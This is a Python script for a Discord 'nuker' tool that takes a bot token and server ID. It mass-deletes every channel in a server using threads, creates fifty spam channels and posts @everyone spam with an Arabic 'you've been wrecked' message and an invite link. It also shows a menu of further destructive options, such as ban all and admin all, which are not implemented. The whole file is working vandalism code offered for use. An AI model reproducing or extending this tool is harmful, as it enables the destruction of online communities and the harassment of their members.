import requests
import threading
import os
from colorama import Fore, Style, init

init(autoreset=True)

LOGO = f"""{Fore.RED}
  ███████╗███████╗███████╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
  ╚══███╔╝╚════██║██╔════╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
    ███╔╝     ██╔╝█████╗      ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
   ███╔╝     ██╔╝ ██╔══╝      ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
  ███████╗  ██╔╝  ██║         ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
  ╚══════╝  ╚═╝   ╚═╝         ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}"""

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

class Z7F_Nuker:
    def __init__(self, token):
        self.token = token
        self.headers = {'Authorization': f'Bot {token}'}
        self.base_url = "https://discord.com/api/v9"

    def delete_channel(self, channel_id):
        requests.delete(f"{self.base_url}/channels/{channel_id}", headers=self.headers)

    def create_channel(self, guild_id):
        payload = {"name": "BN3AL-XxX-6666-Group", "type": 0}
        requests.post(f"{self.base_url}/guilds/{guild_id}/channels", headers=self.headers, json=payload)

    def spam_msg(self, channel_id):
        payload = {"content": "@everyone **تم جحفلتكم من قبل قروب XxX**\nhttps://discord.gg/qb3FGfp4d"}
        requests.post(f"{self.base_url}/channels/{channel_id}/messages", headers=self.headers, json=payload)

    def get_channels(self, guild_id):
        r = requests.get(f"{self.base_url}/guilds/{guild_id}/channels", headers=self.headers)
        return r.json()

def start_attack():
    clear()
    print(LOGO)
    print(f"{Fore.YELLOW} [1] FULL NUKE      [2] ROLES NUKE     [3] CHANNEL NUKE")
    print(f" [4] SPAM WEBHOOK   [5] SPAM DM        [6] KICK BOTS")
    print(f" [7] TIMEOUT ALL    [8] BAN ALL        [9] ADMIN ALL")
    print(f" [10] SPAM EMBED")
    
    choice = input(f"\n{Fore.CYAN} [?] Select: ")
    token = input(f" [>] Bot Token: ")
    guild_id = input(f" [>] Server ID: ")
    
    nuker = Z7F_Nuker(token)
    
    if choice == "3": # مثال لسرعة تنفيذ مسح وإنشاء الرومات
        channels = nuker.get_channels(guild_id)
        print(f"{Fore.GREEN} [+] Starting Channel Nuke...")
        
        # استخدام Threading للسرعة القصوى
        for c in channels:
            threading.Thread(target=nuker.delete_channel, args=(c['id'],)).start()
        
        for _ in range(50):
            threading.Thread(target=nuker.create_channel, args=(guild_id,)).start()

    # يمكنك إضافة باقي الوظائف بنفس طريقة threading.Thread
    print(f"\n{Fore.RED} [!] Attack Sent!")

if __name__ == "__main__":
    start_attack()
